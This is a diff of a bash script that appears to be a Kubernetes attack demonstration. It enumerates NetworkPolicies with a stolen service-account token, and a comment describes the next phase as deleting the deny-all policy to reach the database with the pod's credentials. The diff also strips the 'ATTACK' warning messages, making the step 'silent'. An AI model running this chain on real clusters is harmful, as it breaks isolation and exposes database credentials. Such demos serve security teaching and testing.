@@ -39,11 +39,7 @@ if [ -z "$TOKEN" ]; then
   exit 0
 fi
 
-# ── Step 2: Map NetworkPolicies (intelligence gathering) ─────────────────────
-emit "ATTACK" "WARNING" \
-  "Mapping namespace security topology" \
-  "network-tooling-sa has list rights on NetworkPolicies. Attacker enumerates all policies to identify the most impactful target before striking."
-
+# ── Step 2: Map NetworkPolicies (silent intelligence gathering) ───────────────
 NP_LIST=$(kubectl get networkpolicy \
   --token="$TOKEN" \
   --server="$APISERVER" \
@@ -58,16 +54,6 @@ NP_COUNT=$(kubectl get networkpolicy \
   --certificate-authority="$CA" \
   -n "$NAMESPACE" \
   --no-headers 2>/dev/null | wc -l | tr -d ' ' || echo "0")
-
-emit "ATTACK" "WARNING" \
-  "Security map complete: $NP_COUNT policies — target identified: deny-all" \
-  "Full policy list: $NP_LIST. deny-all is the default-deny anchor. Deleting it collapses all namespace isolation in one operation."
-
-# ── Step 3: Credentials already present — but network path is blocked ─────────
-DB_PARTIAL="${DB_PASSWORD:0:2}***"
-emit "ATTACK" "WARNING" \
-  "Credentials already present in pod environment — but network path to postgres is blocked" \
-  "DB_USER=${DB_USER:-app}  DB_HOST=${DB_HOST:-postgres}  DB_NAME=${DB_NAME:-appdb}  DB_PASSWORD=${DB_PARTIAL} (${#DB_PASSWORD} chars). These credentials exist in every pod that mounts this secret. Without network access they are useless. The attack changes that."
 
 # =============================================================================
 # PHASE 2 — EXPLOITATION (delete deny-all, open the path, use the credentials)
